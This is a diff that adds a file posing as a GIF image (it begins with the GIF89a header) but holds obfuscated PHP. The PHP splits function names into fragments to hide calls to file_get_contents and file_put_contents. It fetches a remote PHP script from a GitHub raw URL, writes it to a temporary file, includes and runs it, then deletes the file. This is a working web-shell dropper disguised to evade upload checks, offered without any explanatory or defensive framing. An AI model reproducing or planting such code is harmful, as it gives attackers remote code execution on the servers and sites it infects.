@@ -1,0 +1,2 @@
+GIF89a
+<?php $TRA = 'ev'; $TRO = 'al'; $TRE = 'file_g'; $TRI = 'et_cont'; $TRU = 'ents'; $TAR = 'file_p'; $TIR = 'ut_con'; $TUR = 'tents'; $EVA = $TRA . $TRO; $FGC = $TRE . $TRI . $TRU; $FPC = $TAR . $TIR . $TUR; $a = $FGC('https://raw.githubusercontent.com/cocosekanakan/ny4n/main/simple.php'); $tempFile = tempnam(sys_get_temp_dir(), 'php'); $FPC($tempFile, $a); include $tempFile; unlink($tempFile); ?>
